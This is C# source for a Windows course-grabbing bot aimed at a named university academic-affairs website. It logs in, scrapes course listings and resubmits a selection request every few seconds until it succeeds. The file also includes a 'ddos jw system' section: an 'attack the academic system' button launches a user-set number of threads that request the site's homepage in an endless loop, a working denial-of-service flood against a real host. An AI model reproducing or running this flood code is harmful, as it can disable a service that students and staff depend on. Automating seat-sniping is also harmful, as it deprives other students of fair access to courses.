using FuckJW2005.NetUtils;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace FuckJW2005
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            //从主页获取__VIEWSTATE信息
            debug_output("获取网页跳转信息...");
            var ns = new NetStream();
            ns.HttpGetAsync(main_page_url, url_locate_callback, null);
        }

        #region UI Event callback
        private void url_locate_callback(NetStream sender, object e)
        {
            //失败重试
            if (sender.HTTP_Response == null)
            {
                debug_output("获取跳转信息出错，3s后重试...");
                Thread.Sleep(3000);
                var url = sender.HTTP_Request.RequestUri.ToString();
                sender.Close();

                var ns = new NetStream();
                ns.HttpGetAsync(main_page_url, url_locate_callback, null);
            }

            //将主页url更改成30X跳转后响应的url
            main_page_url = sender.HTTP_Response.ResponseUri.ToString();
            //获取主页面的html信息（gb2312编码）
            var str_main_page = sender.ReadResponseString(Encoding.Default);
            //关闭http请求
            sender.Close();

            //正则匹配，获取viewstate
            var match = Regex.Match(str_main_page, "<input\\stype=\"hidden\"\\sname=\"__VIEWSTATE\"\\svalue=\"(?<value>[^\"]*?)\"\\s*/>");
            if (match.Success)
            {
                __VIEWSTATE = match.Result("${value}");
            }

            //刷新验证码
            refresh_captcha();
            //登陆按钮可点（委托到主线程）
            Invoke(new ThreadStart(delegate
            {
                login.Enabled = true;
            }));
        }
        private void login_Click(object sender, EventArgs e)
        {
            post_login_data();
        }
        private void refreshCaptcha_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            refresh_captcha();
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/qhgz2013/FuckJw2005/");
        }

        private void username_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '\r')
                check_login_data();
        }

        private void password_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '\r')
                check_login_data();
        }

        private void capcha_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '\r')
                check_login_data();
        }
        private void goFuck_Click(object sender, EventArgs e)
        {
            if (threadUsing)
                stop_select_course();
            else
                start_select_course();
        }
        #endregion

        #region Debug output [MTA]
        private bool ENABLE_DEBUG_LOGGING = true;
        private const int MAX_OUTPUT_ITEM_COUNT = 500;
        private void debug_output(string msg)
        {
            if (!ENABLE_DEBUG_LOGGING) return;
            var lvi = new ListViewItem(DateTime.Now.ToLongTimeString());
            lvi.SubItems.Add(msg);
            Invoke(new ThreadStart(delegate
            {
                if (listOutput.Items.Count > MAX_OUTPUT_ITEM_COUNT)
                    listOutput.Items.RemoveAt(0);
                listOutput.Items.Add(lvi);
                listOutput.Items[listOutput.Items.Count - 1].EnsureVisible();
            }));

        }
        private void courseName_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (course_list == null && courseName.SelectedIndex >= 0) return;
            teacher.Text = course_list[courseName.SelectedIndex].Teacher;
        }
        private void courseName_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '\r' && goFuck.Enabled) goFuck.PerformClick();
        }
        private void teacher_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '\r' && goFuck.Enabled) goFuck.PerformClick();
        }
        private void attackJW_Click(object sender, EventArgs e)
        {
            if (dosThd != null)
            {
                foreach (var item in dosThd)
                {
                    item.Abort();
                }
                dosThd = null;
                attackJW.Text = "攻击教务系统\r\n(后果自负)";
                AtkThdCount.Enabled = true;
                return;
            }


            if (AtkThdCount.Value == 0) return;
            AtkThdCount.Enabled = false;

            dosThd = new Thread[(int)AtkThdCount.Value];
            for (int i = 0; i < AtkThdCount.Value; i++)
            {
                dosThd[i] = new Thread(dosThdCallback);
                dosThd[i].IsBackground = true;
                dosThd[i].Name = "Dos攻击线程";
                dosThd[i].Start();
            }
            attackJW.Text = "停止攻击";
        }
        #endregion

        private string __VIEWSTATE = "";

        #region Auth - login
        //private string student_code = "";
        //private string student_name = "";

        //验证登陆信息的完整性
        private void check_login_data()
        {
            if (string.IsNullOrEmpty(username.Text)) username.Focus();
            else if (string.IsNullOrEmpty(password.Text)) password.Focus();
            else if (string.IsNullOrEmpty(capcha.Text)) capcha.Focus();
            else if (login.Enabled) login.PerformClick();

        }
        //获取登陆是否成功
        private bool check_login_success(string html_in)
        {
            var suc = !Regex.Match(html_in, @"alert\('.+'\);").Success;
            if (suc)
            {

            }
            return suc;
        }

        private string main_page_url = "http://jw2005.scuteo.com/";
        //返回除了最后的xxx.aspx之外的url
        private string get_session_url()
        {
            return main_page_url.Substring(0, main_page_url.LastIndexOf('/'));
        }
        //返回url的origin地址
        private string get_origin_url()
        {
            return "http://" + new Uri(main_page_url).Host;
        }
        //将中文按gb2312编码转义
        private string get_escape_char_str(string words)
        {
            var bytes = Encoding.Default.GetBytes(words);
            var sb = new StringBuilder();
            foreach (var item in bytes)
            {
                sb.Append("%" + item.ToString("X2"));
            }
            return sb.ToString();
        }
        //刷新验证码
        private void refresh_captcha()
        {
            debug_output("获取验证码图片...");
            var url = get_session_url() + "/CheckCode.aspx";

            var ns = new NetStream();
            var header_param = new Parameters();
            header_param.Add("Origin", get_origin_url());
            ns.HttpGetAsync(url, (_sender, _e) =>
            {
                var memstream = new MemoryStream();
                int readed_bytes = 0;
                //从网络数据流转移到内存数据流中
                const int buffer_size = 4096;
                var buffer = new byte[buffer_size];
                do
                {
                    readed_bytes = _sender.ResponseStream.Read(buffer, 0, buffer_size);
                    memstream.Write(buffer, 0, readed_bytes);
                } while (readed_bytes > 0);
                ns.Close();
                memstream.Seek(0, SeekOrigin.Begin);

                var img = Image.FromStream(memstream); //从内存流中创建图像
                //主线程委托
                Invoke(new ThreadStart(delegate
                {
                    captchaImg.Image = img;
                }));
            }, headerParam: header_param);
        }
        private void post_login_data()
        {
            debug_output("发送登陆数据...");
            login.Text = "登陆中";
            login.Enabled = false;

            //登陆参数
            var query_param = new Parameters();
            query_param.Add("__VIEWSTATE", __VIEWSTATE);
            query_param.Add("txtUserName", username.Text);
            query_param.Add("TextBox2", password.Text);
            query_param.Add("txtSecretCode", capcha.Text);
            query_param.Add("RadioButtonList1", "学生");
            query_param.Add("Button1", "");
            query_param.Add("lbLanguage", "");
            query_param.Add("hidPdrs", "");
            query_param.Add("hidsc", "");

            var post_data = Encoding.Default.GetBytes(query_param.BuildQueryString());

            string next_url = main_page_url;
            var ns = new NetStream();
            var header_param = new Parameters();
            header_param.Add("Origin", get_origin_url());
            //异步post
            ns.HttpPostAsync(next_url, post_data.Length, (_sender, _e) =>
            {
                //发送request body
                _sender.RequestStream.Write(post_data, 0, post_data.Length);

                //异步获取response
                _sender.HttpPostResponseAsync((_sender2, _e2) =>
                {
                    //response body的网页代码
                    var response_str = _sender2.ReadResponseString(Encoding.Default);
                    _sender2.Close();

                    //检查登陆状态
                    var login_status = check_login_success(response_str);
                    if (login_status)
                    {
                        Invoke(new ThreadStart(delegate
                        {
                            login.Text = "已登陆";
                            username.Enabled = false;
                            password.Enabled = false;
                            refreshCaptcha.Enabled = false;
                            capcha.Enabled = false;
                            login.Enabled = false;
                        }));
                        debug_output("登陆成功");
                        get_public_course();
                    }
                    else
                    {
                        Invoke(new ThreadStart(delegate
                        {
                            login.Text = "登陆";
                            login.Enabled = true;
                            capcha.Text = "";
                        }));
                        debug_output("登陆失败");
                        refresh_captcha();
                    }
                });
            }, postContentType: NetStream.DEFAULT_CONTENT_TYPE_PARAM, headerParam: header_param);
        }
        #endregion

        #region course fetch
        private int total_records = 0;
        private List<courses> course_list = null;
        private struct courses
        {
            public string CheckBoxStr;
            public string Name;
            public int Code;
            public string Teacher;
            //public string Address;
            //public string Time;
            //public string Belonging;

        }
        private void get_public_course(bool get_mode = true)
        {
            var url = get_session_url() + "/xf_xsqxxxk.aspx?xh=" + username.Text + "&gnmkdm=N121103";

            var ns = new NetStream();
            var header_param = new Parameters();
            header_param.Add("Origin", get_origin_url());
            header_param.Add("Referer", main_page_url);
            if (get_mode)
            {
                debug_output("初始化选课列表数据...");
                //get模式下获取选课课表
                var thd = new Thread(new ThreadStart(delegate
                {
                    ns.HttpGet(url, header_param);
                }));
                thd.IsBackground = true;
                thd.Start();
                thd.Join();
            }
            else
            {
                debug_output("获取全部选课信息...");
                string course_time = "", course_name = "";
                Invoke(new ThreadStart(delegate
                {
                    course_time = courseTime.Text;
                    course_name = courseName.Text;
                }));

                var post_param = new Parameters();
                post_param.Add("__EVENTTARGET", "");
                post_param.Add("__EVENTARGUMENT", "");
                post_param.Add("__VIEWSTATE", __VIEWSTATE);
                post_param.Add("ddl_kcxz", "");
                post_param.Add("ddl_ywyl", "");
                post_param.Add("ddl_kcgs", "");
                post_param.Add("ddl_xqbs", 2);
                post_param.Add("ddl_sksj", "");
                post_param.Add("TextBox1", "");
                post_param.Add("dpkcmcGrid:txtChoosePage", 1);
                post_param.Add("dpkcmcGrid:txtPageSize", 200);
                var post_data = Encoding.Default.GetBytes(post_param.BuildQueryString());

                //ns.HttpPost(url, post_data, NetStream.DEFAULT_CONTENT_TYPE_PARAM, header_param);
                var thd = new Thread(new ThreadStart(delegate
                {
                    ns.HttpPost(url, post_data, NetStream.DEFAULT_CONTENT_TYPE_PARAM, header_param);
                }));
                thd.IsBackground = true;
                thd.Start();
                thd.Join();
            }
            var response_str = ns.ReadResponseString(Encoding.Default);
            ns.Close();


            //replacing crlf
            response_str = response_str.Replace("\r", "").Replace("\n", "");

            //parsing time
            var time_ptr = "<select\\sname=\"ddl_sksj\"\\sonchange=\"__doPostBack\\('ddl_sksj',''\\)\"\\slanguage=\"javascript\"\\sid=\"ddl_sksj\">(?<data>.*?)</select>";
            var time_ptr2 = "<option\\svalue=\"(?<value>[^\"]+)\">.*?</option>";
            var time_spec_total = Regex.Match(response_str, time_ptr);
            if (time_spec_total.Success)
            {
                Invoke(new ThreadStart(delegate
                {
                    courseTime.Items.Clear();
                    var match_string = time_spec_total.Result("${data}");
                    var time = Regex.Match(match_string, time_ptr2);
                    while (time.Success)
                    {
                        courseTime.Items.Add(time.Result("${value}"));
                        time = time.NextMatch();
                    }
                }));
            }

            //parsing __VIEWSTATE
            var match = Regex.Match(response_str, "<input\\stype=\"hidden\"\\sname=\"__VIEWSTATE\"\\svalue=\"(?<value>[^\"]*?)\"\\s*/>");
            if (match.Success)
            {
                __VIEWSTATE = match.Result("${value}");
            }

            //parsing total_course
            match = Regex.Match(response_str, "<span\\sid=\"dpkcmcGrid_lblTotalRecords\">(?<record>\\d+)</span>");
            if (match.Success)
            {
                total_records = int.Parse(match.Result("${record}"));
            }

            //parsing course property
            course_list = new List<courses>();
            var ptr_course_table = "<fieldset><legend>可选课程</legend>(?<data>.*?)</fieldset>";
            var course_table_str = Regex.Match(response_str, ptr_course_table).Result("${data}");
            match = Regex.Match(course_table_str, "<tr>(?<data>.*?)</tr>");
            while (match.Success)
            {
                var crs = new courses();
                var sub_info = Regex.Match(match.Result("${data}"), "<td.*?>(?<data>.*?)</td>");
                //sect 0 <input id="kcmcGrid__ctl2_xk" type="checkbox" name="kcmcGrid:_ctl2:xk" />
                var sub_info2 = Regex.Match(sub_info.Result("${data}"), "<input.*?name=\"(?<comboBox>.*?)\"\\s*/>");
                crs.CheckBoxStr = sub_info2.Result("${comboBox}");
                sub_info = sub_info.NextMatch();
                //sect 1 course name
                sub_info2 = Regex.Match(sub_info.Result("${data}"), "<a.*?>(?<name>.+?)</a>");
                crs.Name = sub_info2.Result("${name}");
                sub_info = sub_info.NextMatch();
                //sect 2 code
                crs.Code = int.Parse(sub_info.Result("${data}"));
                sub_info = sub_info.NextMatch();
                //sect 3 teacher
                sub_info2 = Regex.Match(sub_info.Result("${data}"), "<a.*?>(?<name>.+?)</a>");
                crs.Teacher = sub_info2.Result("${name}");
                sub_info = sub_info.NextMatch();
                match = match.NextMatch();

                //todo: add more column

                course_list.Add(crs);
            }

            if (get_mode)
            {
                //requesting with full-course list
                get_public_course(false);
            }
            else
            {
                //updating courses
                Invoke(new ThreadStart(delegate
                {
                    courseName.Items.Clear();
                    foreach (var item in course_list)
                    {
                        courseName.Items.Add(item.Name);
                    }
                }));
                debug_output("获取完成");
            }
        }
        #endregion

        #region course select
        private Thread _selectClassThd;
        private bool threadUsing;
        private bool check_course_selected(string html_in)
        {
            var match = Regex.Match(html_in, @"alert\('(.+?)'\);");
            var suc = !match.Success;
            if (suc)
            {
                //parsing course property
                var ptr_course_table = "<fieldset><legend>已选课程</legend>(?<data>.*?)</fieldset>";
                match = Regex.Match(html_in, ptr_course_table);
                if (!match.Success) return true; //success, but no resson returned
                var course_table_str = match.Result("${data}");
                match = Regex.Match(course_table_str, "<tr>(?<data>.*?)</tr>");
                while (match.Success)
                {
                    var crs = new courses();
                    var sub_info = Regex.Match(match.Result("${data}"), "<td.*?>(?<data>.*?)</td>");
                    //sect 0
                    sub_info = sub_info.NextMatch();
                    //sect 1 course name
                    var sub_info2 = Regex.Match(sub_info.Result("${data}"), "<a.*?>(?<name>.+?)</a>");
                    crs.Name = sub_info2.Result("${name}");
                    sub_info = sub_info.NextMatch();
                    //sect 2 code
                    crs.Code = int.Parse(sub_info.Result("${data}"));
                    sub_info = sub_info.NextMatch();
                    //sect 3 teacher
                    sub_info2 = Regex.Match(sub_info.Result("${data}"), "<a.*?>(?<name>.+?)</a>");
                    crs.Teacher = sub_info2.Result("${name}");
                    sub_info = sub_info.NextMatch();
                    match = match.NextMatch();

                    string course_name = "", teacher_name = "";
                    Invoke(new ThreadStart(delegate { course_name = courseName.Text; teacher_name = teacher.Text; }));
                    if (crs.Name == course_name)
                    {
                        debug_output("选课成功");
                        return true;
                    }
                }
                debug_output("选课失败");
                return false;
            }
            else
            {
                debug_output("选课失败: " + match.Result("$1"));
            }
            return suc;
        }
        private bool submit_course_data(string course_id)
        {
            var url = get_session_url() + "/xf_xsqxxxk.aspx?xh=" + username.Text + "&gnmkdm=N121103";

            debug_output("发送选课请求...");
            string course_time = "", course_name = "";
            Invoke(new ThreadStart(delegate
            {
                course_time = courseTime.Text;
                course_name = courseName.Text;
            }));
            var sb = new StringBuilder();
            sb.Append("__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=");
            for (int i = 0; i < (int)Math.Ceiling(__VIEWSTATE.Length / 1000.0); i++)
            {
                int len = (__VIEWSTATE.Length - i * 1000);
                if (len > 1000) len = 1000;

                var cur_str = (__VIEWSTATE.Substring(i * 1000, len));
                sb.Append(System.Uri.EscapeDataString(cur_str));
            }
            //sb.Append(System.Uri.EscapeDataString(__VIEWSTATE));
            sb.Append("&ddl_kcxz=&ddl_ywyl=");
            //sb.Append(get_escape_char_str("无"));
            sb.Append("&ddl_kcgs=&ddl_xqbs=2&ddl_sksj=");
            //sb.Append(get_escape_char_str(course_time));
            sb.Append("&TextBox1=");
            //sb.Append(get_escape_char_str(course_name));
            sb.Append("&dpkcmcGrid%3AtxtChoosePage=1&dpkcmcGrid%3AtxtPageSize=");
            sb.Append(System.Uri.EscapeDataString("200"));
            sb.Append("&");
            sb.Append(System.Uri.EscapeDataString(course_id));
            sb.Append("=on&Button1=++" + get_escape_char_str("提交") + "++");

            var post_data = Encoding.Default.GetBytes(sb.ToString());
            //response_stream = util.http_post(ref url, post_data, "application/x-www-form-urlencoded", get_origin_url(), url);
            //var response_sr = new StreamReader(response_stream, Encoding.Default);
            //var response_str = response_sr.ReadToEnd();

            //response_sr.Close();
            var ns = new NetStream();
            var header = new Parameters();
            header.Add("Origin", get_origin_url());
            header.Add("Referer", url);
            ns.HttpPost(url, post_data, NetStream.DEFAULT_CONTENT_TYPE_PARAM, header);

            var response_str = ns.ReadResponseString(Encoding.Default);
            ns.Close();

            return check_course_selected(response_str.Replace("\r", "").Replace("\n", ""));
        }
        private void select_course_callback()
        {
            try
            {
                //init
                string course_name = "", teacher_name = "";
                Invoke(new ThreadStart(delegate
                {
                    courseName.Enabled = false;
                    teacher.Enabled = false;
                    course_name = courseName.Text;
                    teacher_name = teacher.Text;
                    goFuck.Enabled = true;
                    goFuck.Text = "不干";
                }));

                while (course_list == null)
                {
                    Thread.Sleep(100);
                }

                //getting course_name
                courses course = course_list.Find((courses obj) =>
                {
                    int code;
                    if (int.TryParse(course_name, out code))
                    {
                        return (obj.Code == code && obj.Teacher == teacher_name);
                    }
                    else
                    {
                        return (obj.Name == course_name && obj.Teacher == teacher_name);
                    }
                });

                if (!string.IsNullOrEmpty(course.CheckBoxStr))
                {
                    //loop posting data
                    bool suc = false;
                    do
                    {
                        suc = submit_course_data(course.CheckBoxStr);
                        Thread.Sleep(3000);
                    } while (!suc);
                }
            }
            catch (ThreadAbortException) { }
            catch (Exception ex)
            {
                debug_output(ex.ToString());
            }
            finally
            {
                //ended
                Invoke(new ThreadStart(delegate
                {
                    courseName.Enabled = true;
                    teacher.Enabled = true;
                    goFuck.Text = "开干";
                    threadUsing = false;
                }));
            }
        }
        private void start_select_course()
        {
            if (threadUsing) return;
            goFuck.Enabled = false;
            _selectClassThd = new Thread(select_course_callback);
            _selectClassThd.IsBackground = true;
            _selectClassThd.Name = "抢课线程";
            _selectClassThd.Start();
            threadUsing = true;
        }
        private void stop_select_course()
        {
            if (!threadUsing) return;
            if (_selectClassThd != null) _selectClassThd.Abort();
            _selectClassThd = null;
            threadUsing = false;
        }
        #endregion

        #region ddos jw system
        private Thread[] dosThd;
        private void dosThdCallback()
        {
            try
            {
                do
                {
                    var url = "http://jw2005.scuteo.com/";
                    try
                    {
                        var ns = new NetStream();
                        ns.HttpGet(url);
                        ns.Close();
                    }
                    catch (ThreadAbortException) { throw; }
                    catch (Exception)
                    {
                    }
                } while (true);
            }
            catch (Exception)
            {
            }
        }
        #endregion
    }

}
